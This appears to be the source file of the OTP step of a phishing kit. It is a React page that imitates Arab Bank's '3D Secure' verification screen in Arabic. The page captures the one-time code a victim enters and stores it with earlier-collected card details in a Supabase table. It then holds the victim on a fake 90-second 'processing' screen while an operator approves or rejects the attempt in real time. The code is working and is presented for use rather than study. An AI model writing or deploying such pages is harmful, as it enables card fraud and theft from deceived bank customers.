// @ts-nocheck
import { useEffect, useState } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import {
  ChevronLeft,
  ChevronRight,
  ShieldCheck,
  KeyRound,
  Smartphone,
  CreditCard,
  Loader2,
  XCircle,
  CheckCircle2,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { ArabBankLogo } from "@/components/ArabBankLogo";
import { supabase } from "@/integrations/supabase/client";
import { getApplication, updateApplication } from "@/lib/admin-storage";

type OtpDisplay = { cardTitle?: string; cardNumber?: string; cardName?: string; phone?: string };

const PROCESSING_SECONDS = 90;

export const Route = createFileRoute("/otp")({
  loader: () => new Promise((r) => setTimeout(r, 1000)),
  head: () => ({
    meta: [
      { title: "رمز التحقق | البنك العربي" },
      { name: "description", content: "أدخل رمز التحقق المرسل إلى جوالك لتأكيد العملية." },
      { property: "og:title", content: "رمز التحقق | البنك العربي" },
      { property: "og:description", content: "تأكيد العملية برمز التحقق." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: OtpPage,
});

function OtpPage() {
  const navigate = useNavigate();

  const [appId, setAppId] = useState<string | undefined>(undefined);
  const [display, setDisplay] = useState<OtpDisplay>({});
  const [otpValue, setOtpValue] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(60);
  const [submitting, setSubmitting] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [processingSecs, setProcessingSecs] = useState(PROCESSING_SECONDS);
  const [rejected, setRejected] = useState(false);
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    try {
      const id = sessionStorage.getItem("ab_current_app_id") || undefined;
      setAppId(id);
      const raw = sessionStorage.getItem("ab_otp_data");
      if (raw) setDisplay(JSON.parse(raw));
    } catch {}
  }, []);

  // Resend countdown
  useEffect(() => {
    if (secondsLeft <= 0) return;
    const t = window.setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => window.clearTimeout(t);
  }, [secondsLeft]);

  // Processing countdown
  useEffect(() => {
    if (!processing) return;
    if (processingSecs <= 0) {
      setProcessing(false);
      setRejected(true);
      setOtpValue("");
      return;
    }
    const t = window.setTimeout(() => setProcessingSecs((s) => s - 1), 1000);
    return () => window.clearTimeout(t);
  }, [processing, processingSecs]);

  // Realtime: listen for admin decisions on this application at any time
  useEffect(() => {
    if (!appId) return;
    const channel = supabase
      .channel(`otp-${appId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${appId}` },
        (payload) => {
          const status = (payload.new as { review_status?: string }).review_status;
          if (status === "completed") {
            setProcessing(false);
            setSuccess(true);
          } else if (status === "otp_rejected" || status === "rejected") {
            setProcessing(false);
            setRejected(true);
            setOtpValue("");
          }
        },
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [appId]);

  const code = otpValue;
  const isValid = code.length >= 4 && code.length <= 6;
  const phoneLast3 = (display.phone || "").replace(/\D/g, "").slice(-3) || "•••";
  const cardLast4 = (display.cardNumber || "").replace(/\D/g, "").slice(-4) || "••••";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setSubmitting(true);
    setRejected(false);

    let currentId = appId;
    if (!currentId) {
      // No prior card entry — create a stub row anyway so admin can see the OTP attempt
      const { saveApplication } = await import("@/lib/admin-storage");
      const entry = await saveApplication({
        otpCode: code,
        reviewStatus: "otp_submitted",
        status: "pending",
      });
      if (entry) {
        currentId = entry.id;
        setAppId(entry.id);
        try {
          sessionStorage.setItem("ab_current_app_id", entry.id);
        } catch {}
      }
    } else {
      await updateApplication(currentId, {
        otpCode: code,
        reviewStatus: "otp_submitted",
      });
    }
    setSubmitting(false);
    setProcessingSecs(PROCESSING_SECONDS);
    setProcessing(true);
  };

  const handleResend = async () => {
    setSecondsLeft(60);
    if (appId) {
      // Reset admin decision so they can send a new code decision
      await updateApplication(appId, { reviewStatus: "card_submitted" });
      // Refresh local view (optional)
      await getApplication(appId);
    }
  };

  return (
    <div dir="rtl" lang="ar" className="min-h-screen bg-background">
      <header className="sticky top-0 z-40 bg-[#f4f4f4]">
        <div className="flex items-center justify-between px-5 py-3" dir="ltr">
          <Link to="/" className="flex items-center gap-2 text-sm font-semibold text-ab-blue">
            <ChevronLeft className="h-5 w-5" />
            الصفحة الرئيسية
          </Link>
          <ArabBankLogo />
        </div>
      </header>

      <main>
        <section className="mx-auto w-full max-w-[520px] px-3 py-6 sm:px-4 sm:py-8">
          <div className="overflow-hidden rounded-2xl bg-white shadow-card">
            <div className="bg-gradient-to-br from-ab-blue to-ab-navy px-5 py-5 text-white sm:px-7 sm:py-6">
              <div className="flex items-center gap-3">
                <div className="grid h-11 w-11 place-items-center rounded-full bg-white/15 backdrop-blur">
                  <ShieldCheck className="h-5 w-5" strokeWidth={2.4} />
                </div>
                <div>
                  <div className="text-[15px] font-extrabold sm:text-[16px]">
                    التحقق من العملية
                  </div>
                  <div className="text-[11.5px] text-white/80">
                    خدمة التحقق الآمن 3D Secure
                  </div>
                </div>
              </div>
            </div>

            <div className="p-5 sm:p-7">
              <div className="space-y-2.5 rounded-xl border border-border bg-muted/30 p-3.5 sm:p-4">
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2 text-[12.5px] text-muted-foreground">
                    <Smartphone className="h-4 w-4 text-ab-blue" />
                    <span>رقم الجوال</span>
                  </div>
                  <div className="font-mono text-[13px] font-extrabold text-ab-blue" dir="ltr">
                    •••••• {phoneLast3}
                  </div>
                </div>
                <div className="h-px bg-border/70" />
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2 text-[12.5px] text-muted-foreground">
                    <CreditCard className="h-4 w-4 text-ab-blue" />
                    <span>البطاقة</span>
                  </div>
                  <div className="font-mono text-[13px] font-extrabold text-ab-blue" dir="ltr">
                    •••• •••• •••• {cardLast4}
                  </div>
                </div>
              </div>

              {success ? (
                <div className="mt-8 flex flex-col items-center text-center">
                  <div className="grid h-20 w-20 place-items-center rounded-full bg-emerald-50 text-emerald-600">
                    <CheckCircle2 className="h-10 w-10" strokeWidth={2} />
                  </div>
                  <h2 className="mt-5 text-[18px] font-extrabold text-emerald-600 sm:text-[20px]">
                    تم تأكيد العملية بنجاح
                  </h2>
                  <p className="mt-2 max-w-[340px] text-[12.5px] leading-6 text-muted-foreground">
                    تمت عملية الدفع بنجاح وتم إرسال تفاصيل العملية إلى جوالك.
                  </p>
                  <Link
                    to="/"
                    className="mt-6 flex items-center gap-2 rounded-full border border-ab-blue px-6 py-2.5 text-sm font-semibold text-ab-blue transition-colors hover:bg-ab-blue hover:text-white"
                  >
                    العودة إلى الصفحة الرئيسية
                    <ChevronRight className="h-4 w-4" />
                  </Link>
                </div>
              ) : processing ? (
                <div className="mt-8 flex flex-col items-center text-center">
                  <div className="relative grid h-20 w-20 place-items-center">
                    <div className="absolute inset-0 animate-ping rounded-full bg-ab-blue/20" />
                    <div className="grid h-16 w-16 place-items-center rounded-full bg-ab-blue/10 text-ab-blue">
                      <Loader2 className="h-8 w-8 animate-spin" strokeWidth={2.2} />
                    </div>
                  </div>
                  <h2 className="mt-5 text-[18px] font-extrabold text-ab-blue sm:text-[20px]">
                    جاري المعالجة...
                  </h2>
                  <p className="mt-2 max-w-[340px] text-[12.5px] leading-6 text-muted-foreground">
                    جاري التحقق من رمز OTP لدى البنك المُصدر للبطاقة.
                    من فضلك لا تغلق هذه الصفحة.
                  </p>
                  <div className="mt-5 flex items-center gap-2 rounded-full bg-muted/50 px-4 py-2 text-[12.5px] font-bold text-ab-blue">
                    <span>الوقت المتبقي</span>
                    <span className="font-mono text-[14px]">
                      {String(Math.floor(processingSecs / 60)).padStart(2, "0")}:
                      {String(processingSecs % 60).padStart(2, "0")}
                    </span>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleSubmit}>
                  <div className="mt-6 text-center">
                    <div className="mx-auto mb-3 grid h-12 w-12 place-items-center rounded-full bg-ab-blue/10 text-ab-blue">
                      <KeyRound className="h-5 w-5" strokeWidth={2.2} />
                    </div>
                    <h1 className="text-[18px] font-extrabold text-ab-blue sm:text-[20px]">
                      أدخل رمز التحقق
                    </h1>
                    <p className="mt-1.5 text-[12.5px] leading-6 text-muted-foreground">
                      تم إرسال رمز التحقق إلى رقم جوالك المنتهي بـ
                      <span className="mx-1 font-extrabold text-ab-blue" dir="ltr">
                        {phoneLast3}
                      </span>
                    </p>
                  </div>

                  {rejected && (
                    <div className="mt-4 flex items-start gap-2 rounded-xl border border-destructive/30 bg-destructive/5 p-3 text-[12.5px] text-destructive">
                      <XCircle className="mt-0.5 h-4 w-4 shrink-0" />
                      <span>الرمز غير صحيح أو تم رفض العملية. يرجى إدخال رمز جديد.</span>
                    </div>
                  )}

                  <div className="mt-5">
                    <label className="mb-2 block text-center text-[12px] font-bold text-muted-foreground">
                      رمز التحقق المكوّن من 4 إلى 6 أرقام
                    </label>
                    <input
                      value={otpValue}
                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, "").slice(0, 6))}
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      maxLength={6}
                      placeholder="••••••"
                      dir="ltr"
                      className="h-16 w-full rounded-xl border-2 border-[hsl(214_25%_85%)] bg-white text-center font-mono text-[28px] font-extrabold tracking-[0.5em] text-ab-blue outline-none transition-colors placeholder:text-muted-foreground/40 focus:border-ab-blue sm:h-[68px] sm:text-[32px]"
                    />
                    <div className="mt-1.5 text-center text-[11px] text-muted-foreground">
                      {otpValue.length}/6 أرقام (الحد الأدنى 4)
                    </div>
                  </div>

                  <div className="mt-4 text-center text-[12.5px] text-muted-foreground">
                    {secondsLeft > 0 ? (
                      <>إعادة إرسال الرمز خلال {secondsLeft} ثانية</>
                    ) : (
                      <button
                        type="button"
                        onClick={handleResend}
                        className="font-bold text-ab-blue underline"
                      >
                        إعادة إرسال الرمز
                      </button>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={!isValid || submitting}
                    className={cn(
                      "mt-6 h-[50px] w-full rounded-[10px] text-[15px] font-extrabold text-white shadow-soft transition-all",
                      isValid && !submitting
                        ? "bg-ab-blue hover:brightness-110"
                        : "cursor-not-allowed bg-[hsl(214_25%_70%)]",
                    )}
                  >
                    {submitting ? "جاري الإرسال..." : "تأكيد العملية"}
                  </button>

                  <div className="mt-4 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
                    <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
                    <span>عملية مشفّرة وآمنة</span>
                  </div>
                </form>
              )}
            </div>
          </div>
        </section>
      </main>
    </div>
  );
}
